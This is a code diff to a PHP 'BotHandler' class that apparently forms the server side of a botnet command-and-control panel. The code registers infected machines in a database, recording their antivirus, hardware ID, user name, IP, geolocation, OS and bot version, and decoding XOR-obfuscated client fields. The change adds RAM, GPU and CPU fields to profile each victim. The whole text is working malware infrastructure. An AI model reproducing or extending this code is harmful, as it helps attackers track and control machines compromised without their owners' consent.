@@ -137,31 +137,33 @@ class BotHandler{
             }
 
         }else{
-        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ram, gpu, cpu, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
   		if(!empty($_POST["av"])){
-    $avcheck = $_POST["av"];
- }else{
-     $avcheck = "none";
- }
- 
- 
- $statement->execute(array(
-                $avcheck,
-                $_POST["hwid"],
-                $this->xor_this($_POST["username"]),
-                $country,
-                $this->xor_this($_POST["nf2"]),
-                $this->xor_this($_POST["nf3"]),
-                $this->xor_this($_POST["nf35"]),
-                $this->xor_this($_POST["nf4"]),
-                $countryLatitude,
-                $countryLongitude,
-                $countryName,
-                $ip,
-                $_POST["os"],
-                $this->xor_this($_POST["botversion"])
-            ));
-        }
+  		    $avcheck = $_POST["av"];
+  		}else{
+  		    $avcheck = "none";
+  		}
+
+         $statement->execute(array(
+                        $avcheck,
+                        $_POST["hwid"],
+                        $this->xor_this($_POST["username"]),
+                        $country,
+                        $this->xor_this($_POST["nf2"]),
+                        $this->xor_this($_POST["nf3"]),
+                        $this->xor_this($_POST["nf35"]),
+                        $this->xor_this($_POST["nf4"]),
+                        $countryLatitude,
+                        $countryLongitude,
+                        $countryName,
+                        $_POST["ram"],
+                        $_POST["gpu"],
+                        $_POST["cpu"],
+                        $ip,
+                        $_POST["os"],
+                        $this->xor_this($_POST["botversion"])
+                    ));
+                }
         echo "waiting";
         die();
     }
